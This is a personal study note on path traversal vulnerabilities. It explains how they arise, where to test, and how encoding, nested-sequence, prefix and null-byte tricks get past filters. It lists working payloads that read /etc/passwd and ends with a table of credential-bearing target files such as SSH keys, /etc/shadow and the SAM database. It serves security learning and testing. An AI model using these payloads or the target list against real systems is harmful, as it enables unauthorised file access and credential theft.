---
created: 2026-05-02
tags:
  - web_hacking
status: substantial
---
## Path traversal

>**Path traversal** (also called **directory traversal**) is a web security vulnerability that occurs when user-controlled input is used to construct paths to files accessed by the application, without adequate validation or sanitization. This allows an attacker to escape the intended directory and access arbitrary files or directories on the server.

>[!important]+ Classification
> - Path traversal is classified under [`A01:2025 Broken Access Control`](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/) and maps to:
> 	- [`CWE-22: Improper Limitation of a Pathname to a Restricted Directory`](https://cwe.mitre.org/data/definitions/22.html)
> 	- [`CWE-23: Relative Path Traversal`](https://cwe.mitre.org/data/definitions/23.html)
> 	- [`CWE-36: Absolute Path Traversal`](https://cwe.mitre.org/data/definitions/36.html)

>[!important] Prerequisites: [[🛠️ Filesystem fundamentals]]. 

>[!example]+
> - A shopping application serves product images via:
> 
> ```http
> GET /load_image?filename=11.png HTTP/1.1
> ```
> 
> - The `load_image` endpoint returns contents of a file with the name specified in the `filename` parameter.
> - The default directory the function searches for files is `/var/www/images`. So `filename=11.png` fetches `/var/www/images/11.png`.
> 
> - If the application doesn't validate the `filename` parameter before retrieval, you can access arbitrary files on the filesystem, such as `/etc/passwd`, using path traversal sequences:
> 
> ```http
> GET /load_image?filename=../../../etc/passwd HTTP/1.1
> ```
> 
> - The resolved path becomes:
> 
> ```powershell
> /var/www/images/../../../etc/passwd
> ```
> 
> - The three consecutive `../` sequences step up from `/var/www/images/` to the filesystem root, so the application actually retrieves:
> 
> ```powersell
> /etc/passwd
> ```

### Potential impact

- Path traversal vulnerabilities usually lead to **sensitive information exposure**. The information you may be able to retrieve includes:
	- Credentials (usernames/passwords)
	- API keys
	- SSH keys
	- Source code (reading `.php`, `.java`, `.py` source files)
	- Log files
	- User-uploaded content

## Injection points

- Parameters commonly vulnerable to path traversal include:
	- URL parameters referencing filenames: `?file=`, `?page=`, `?template=`, `?doc=`, `?image=`, `?path=`.
	- `Content-Disposition` / `filename` in `multipart/form-data` request file uploads.

>[!burp]+ In Burp Suite, go to `Proxy` -> `HTTP history` and search for requests with parameters that accept file names. For manual testing, right-click the request you want to test -> `Send to Repeater`.

- Before testing, establish the baseline. Send a normal request and note:
	- Response size and content type for a valid filename. 
	- Whether requesting non-existing files returns `404`, blank response, or an error message (error messages may often disclose base path).

## Detecting path traversal and evading filters

>[!burp] In Burp Intruder, the predefined payload list `Fuzzing - path traversal` contains a comprehensive list of payloads to try when testing for Path Traversal.

- [ ] Basic path traversal: `../../../etc/passwd`.
- [ ] Absolute path: `/etc/passwd`.
- [ ] Nested sequences: `....//....//....//etc/passwd`.
- [ ] URL encoding:  `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`.
- [ ] Double URL-encoded: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`.
- [ ] Base path prefix: `/var/www/images/../../../etc/passwd`.
- [ ] Null byte injection for extension checks: `../../../etc/passwd%00.png`.
### Basic path traversal 

- Inject basic path traversal payload:

```powershell
../../../etc/passwd      # Linux
```

- If successful, should return the contents of the `/etc/passwd` file (`root:x:0:0...`; world-readable).

>[!tip]+
>- Start with a large number of `../` sequences and decrement them gradually to count directory depth from the base path:
>```powershell
>../../../../../../../../../etc/passwd
>../../../../../../../../etc/passwd
>../../../../../../../etc/passwd
>../../../../../../etc/passwd
>```
>- Overshooting is harmless — extra `../` sequences at the filesystem root are **ignored** by the OS.
>- Say, the base path is `/var/www/images`, then `../../../etc/passwd` and`../../../../../etc/passwd` are equivalent and would both return `/etc/passwd`.

### Absolute path traversal

- Some applications strip `../` sequences entirely but pass the resulting string directly to a filesystem API. If the endpoint accepts filenames that begin with `/`, pass an absolute path:

```powershell
filename=/etc/passwd
```

### Nested sequences 

- Applications may strip `../`, but if the filter is non-recursive, it can be bypassed using nested path traversal sequences:

```powershell
....//  ⇢  strip ../  ⇢  ../
....\/  ⇢  strip ..\  ⇢  ../
```

- `....//....//....//` -> After removing one `../`, still leaves `../`.
- `..../\..../\..../\` -> Mixes slashes `/` and backslashes `\` for cross-platform bypass.

```powershell
....//....//....//etc/passwd
```

```powershell
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..../\..../\..../\etc/passwd
```

![[nested_path_traversal_sequences.svg|400]]


- The filter removes one `../` per occurrence and leaves the remainder intact, which the filesystem resolves normally.

### Encoding

- Web servers and application frameworks often decode percent-encoded characters before passing them to route handlers. 
- When path sanitization happens *before* decoding (or is applied to already-decoded input but misses sequences encoded twice), encoding bypasses work.

| Character | URL encoding                                                 | Double URL encoding | Unicode encoding     | Overlong UTF-8 Unicode encoding |
| --------- | ------------------------------------------------------------ | ------------------- | -------------------- | ------------------------------- |
| `.`       | `%2e`                                                        | `%252e`             | `%u002e`             | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/`       | `%2f`                                                        | `%252f`             | `%u2215`             | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\`       | `%5c`                                                        | `%255c`             | `%u2216`             | `%c0%5c`, `%c0%80%5c`           |
| `../`     | `<span style='color: var(--mk-color-blue)'>%2e%2e%2f</span>` | `%252e%252e%252f`   | `%u002e%u002e%u002f` | `%c0%2e%c0%2e%c0%af`            |
| `..\`     | `%2e%2e%5c`                                                  | `%252e%252e%255c`   | `%u002e%u002e%u005c` | `%c0%2e%c0%2e%c0%5c`            |

- **URL encoding**

```powershell
../  ⇢  %2e%2e%2f
..\  ⇢  %2e%2e%5c
```

```powershell
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd # ../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

- **Double URL encoding**
	- Used when the server or a proxy decodes the input once, applies filtering, then passes the result to another layer that decodes it a second time:

```powershell
../  ⇢  %252e%252e%252f
..\  ⇢  %252e%252e%255c
```

- **Non-standard / overlong UTF-8 encoding**
	- Some parsers accept overlong or non-standard Unicode encodings for ASCII characters. This bypasses filters that look for literal `.` and `/` in standard encodings:

```powershell
..%c0%af        ⇢  ../  (overlong UTF-8 for /)
..%ef%bc%8f     ⇢  ../  (fullwidth solidus)
%c0%ae%c0%ae/   ⇢  ../  (overlong dots)
```

>[!note] See [[🛠️ Obfuscating attacks using encoding]]
### Required base path prefix

- Some applications validate that the supplied filename _starts with_ the expected base directory before passing it to the filesystem.

>[!example]+
> ```python
> if not filename.startswith("/var/www/images"):
>     return 403
> ```

- Satisfy the prefix check, then traverse out:

```powershell
/var/www/images/../../../etc/passwd
```

- The filepath string starts with `/var/www/images`, so it bypasses the check. The filesystem then resolves the full path, traversing back to root and then to `/etc/passwd`.

### Required file extension suffix

- Applications may enforce that the filename ends with an expected extension.

>[!example]+
> ```python
> if not filename.endswith(".png"):
>     return 403
> ```

- To bypass, try using a **null byte** (`%00`) to terminate the path before the enforced extension reaches the filesystem API:

```powershell
../../../etc/passwd%00.png
```

- The application's string comparison sees `...passwd\x00.png` and considers it valid. The OS call sees `...passwd` and stops at `\x00`.
- Languages like PHP (pre-`5.3.4`) and older C-based runtimes pass strings to OS calls terminated at the first null byte.

> [!note] Null byte injection is largely ineffective against modern runtimes (PHP 5.3.4+, Java, .NET). It remains relevant in legacy applications and embedded systems.

## References and further reading

- [`Path traversal — PortSwigger Web Security Academy`](https://portswigger.net/web-security/file-path-traversal)
- [`Directory Traversal — PayloadsAllTheThings`](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/#tools)
- [`Testing Directory Traversal File Include — OWASP/wstg`](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)
- [`Path Traversal — OWASP`](https://owasp.org/www-community/attacks/Path_Traversal)
## Appendix A: High-value files to target

### Linux

|File|Content|
|---|---|
|`/etc/passwd`|User account info (world-readable)|
|`/etc/shadow`|Hashed passwords (requires root)|
|`/etc/hosts`|Local DNS entries, internal hostnames|
|`/proc/self/environ`|Current process environment variables|
|`/proc/self/cmdline`|Command used to launch the current process|
|`/proc/net/tcp`|Active TCP connections (hex-encoded)|
|`~/.ssh/id_rsa`|SSH private key|
|`/var/log/apache2/access.log`|Web server access log (log poisoning vector)|
|`/var/log/apache2/error.log`|Web server error log|
|`/app/config/database.yml`|Rails DB config|
|`../../config.php`|Relative to web root — common PHP config|

### Windows

|File|Content|
|---|---|
|`C:\Windows\win.ini`|Legacy config, reliable read-test target|
|`C:\Windows\System32\drivers\etc\hosts`|Host file|
|`C:\inetpub\wwwroot\web.config`|IIS app configuration, may contain credentials|
|`C:\Windows\repair\SAM`|SAM database (requires system privileges)|

